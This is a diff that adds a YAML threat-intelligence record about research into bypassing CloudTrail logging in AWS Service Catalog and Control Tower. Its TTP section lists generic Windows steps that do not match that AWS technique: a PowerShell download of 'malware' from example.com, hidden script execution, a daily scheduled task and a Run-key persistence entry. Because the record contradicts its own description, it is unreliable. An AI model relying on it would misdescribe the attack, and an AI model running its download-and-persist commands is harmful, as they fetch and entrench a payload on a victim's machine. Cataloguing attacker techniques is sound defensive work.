@@ -1,0 +1,48 @@
+description: Researchers discovered methods to bypass CloudTrail logging in AWS Service
+  Catalog and Control Tower, allowing attackers to perform actions without detection.
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\User\\Downloads\\malicious_script.ps1
+  powershell:
+  - Invoke-WebRequest -Uri "http://example.com/malware" -OutFile "C:\\Users\\User\\Downloads\\malicious_script.ps1"
+  - Start-Process cmd.exe /c schtasks /create /tn "UpdateTask" /tr "powershell.exe
+    -NoProfile -WindowStyle Hidden -File C:\\Users\\User\\Downloads\\malicious_script.ps1"
+    /sc daily
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateTask
+  image_load: []
+  network_connections:
+  - aws242-servicecatalog-beta.us-east-1.amazonaws.com
+  - aws242-servicecatalog-gamma.us-east-1.amazonaws.com
+  - gamma.us-east-1.blackbeard.aws.a2z.com
+  - powershell.exe, example.com, 80
+  file_activity:
+  - C:\\Users\\User\\Downloads\\malicious_script.ps1
+  - C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\UpdateTask.lnk
+  persistence:
+  - Scheduled task "UpdateTask" to run daily
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - aws242-servicecatalog-beta.us-east-1.amazonaws.com
+  - aws242-servicecatalog-gamma.us-east-1.amazonaws.com
+  - gamma.us-east-1.blackbeard.aws.a2z.com
+  - example.com
+  urls:
+  - https://controltower.us-east-1.amazonaws.com
+  - https://sts.amazonaws.com
+  - https://cloudformation.us-east-1.amazonaws.com
+  - https://aws242-servicecatalog-beta.us-east-1.amazonaws.com
+  - https://widgets.marketplace.us-west-2.amazonaws.com
+  - https://clientlogger.marketplace.aws.a2z.com
+  - http://example.com/malware
+authors:
+- Nick Frichette
+reference: https://securitylabs.datadoghq.com/articles/bypass-cloudtrail-aws-service-catalog-and-other
+date_of_publication: March 20, 2023
+file_creation_date: December 19, 2025
